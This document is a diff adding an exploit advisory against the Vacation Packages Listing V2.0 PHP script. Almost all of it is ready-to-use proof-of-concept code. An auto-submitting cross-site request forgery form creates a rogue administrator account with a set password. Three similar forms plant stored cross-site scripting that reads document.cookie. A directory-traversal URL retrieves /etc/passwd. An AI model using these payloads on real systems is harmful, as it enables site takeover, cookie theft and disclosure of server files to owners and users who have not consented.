@@ -1,0 +1,93 @@
+Vacation Packages Listing V2.0 - Multiple Vulnerabilities
+====================================================================
+
+####################################################################
+.:. Author         : HackXBack
+.:. Contact        : h-b@usa.com
+.:. Home           : http://www.iphobos.com/blog/
+.:. Script         : http://www.phpjabbers.com/vacation-packages/
+####################################################################
+
+===[ Exploit ]===
+
+[1] Cross Site Request Forgery
+==============================
+
+[Add Admin]
+
+<html>
+<body onload="document.form0.submit();">
+<form method="POST" name="form0" action="
+http://site/index.php?controller=pjAdminUsers&action=pjActionCreate">
+<input type="hidden" name="user_create" value="1"/>
+<input type="hidden" name="role_id" value="1"/>
+<input type="hidden" name="email" value="Email@hotmail.com"/>
+<input type="hidden" name="password" value="123456"/>
+<input type="hidden" name="name" value="Iphobos"/>
+<input type="hidden" name="phone" value="123456789"/>
+<input type="hidden" name="status" value="T"/>
+<input type="hidden" name="contact_title" value=""/>
+<input type="hidden" name="contact_phone" value=""/>
+<input type="hidden" name="contact_mobile" value=""/>
+<input type="hidden" name="contact_fax" value=""/>
+<input type="hidden" name="contact_url" value=""/>
+</form>
+</body>
+</html>
+
+[2] Multiple Cross Site Scripting
+==================================
+
+# CSRF with XSS Exploit:
+
+I. Xss In Types
+
+<html>
+<body onload="document.form0.submit();">
+<form method="POST" name="form0" action="
+http://site/index.php?controller=pjAdminTypes&action=pjActionCreate">
+<input type="hidden" name="type_create" value="1"/>
+<input type="hidden" name="i18n[1][name]"
+value="<script>alert(document.cookie);</script>"/>
+<input type="hidden" name="i18n[3][name]" value=""/>
+<input type="hidden" name="i18n[2][name]" value=""/>
+</form>
+</body>
+</html>
+
+II. Xss In Features
+
+<html>
+<body onload="document.form0.submit();">
+<form method="POST" name="form0" action="
+http://site/index.php?controller=pjAdminFeatures&action=pjActionCreate">
+<input type="hidden" name="feature_create" value="1"/>
+<input type="hidden" name="i18n[1][name]"
+value="<script>alert(document.cookie);</script>"/>
+<input type="hidden" name="i18n[3][name]" value=""/>
+<input type="hidden" name="i18n[2][name]" value=""/>
+</form>
+</body>
+</html>
+
+III. Xss In Countries
+
+<html>
+<body onload="document.form0.submit();">
+<form method="POST" name="form0" action="
+http://site/index.php?controller=pjAdminCountries&action=pjActionCreate">
+<input type="hidden" name="country_create" value="1"/>
+<input type="hidden" name="i18n[1][name]"
+value="<script>alert(document.cookie);</script>"/>
+<input type="hidden" name="i18n[3][name]" value=""/>
+<input type="hidden" name="i18n[2][name]" value=""/>
+</form>
+</body>
+</html>
+
+[3] Local File disclure
+========================
+
+http://site/index.php?controller=pjBackup&action=pjActionDownload&id=../../../../../../../../etc/passwd
+
+####################################################################
